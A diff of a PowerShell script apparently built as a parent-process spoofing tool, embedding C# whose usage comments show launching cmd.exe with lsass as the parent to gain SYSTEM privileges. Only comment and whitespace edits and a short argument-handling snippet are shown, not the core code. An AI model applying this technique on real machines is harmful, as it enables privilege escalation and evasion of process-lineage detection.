@@ -1,5 +1,6 @@
 #usage: [AkuDitemeninOrangTuaKu]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
-#[AkuDitemeninOrangTuaKu]::CreateProcessFromParent(<lsass_pid>,<executeable>,<executeable_arguments>)
+#[AkuDitemeninOrangTuaKu]::CreateProcessFromParent(<lsass_pid>,<executeable>,"<executeable_arguments>"")
+#[AkuDitemeninOrangTuaKu]::CreateProcessFromParent(436,"C:\Windows\System32\cmd.exe","")
 $mycode = @"
 using System;
 using System.Diagnostics;
@@ -150,10 +151,10 @@ public class AkuDitemeninOrangTuaKu
 
 }
 "@
- Add-Type -TypeDefinition $mycode
+Add-Type -TypeDefinition $mycode
 
 #Autoinvoke?
- $cmdargs=""
+$cmdargs=""
 if($args.Length -eq 3)
 {
   $cmdargs= $args[1] + " " + $args[2]
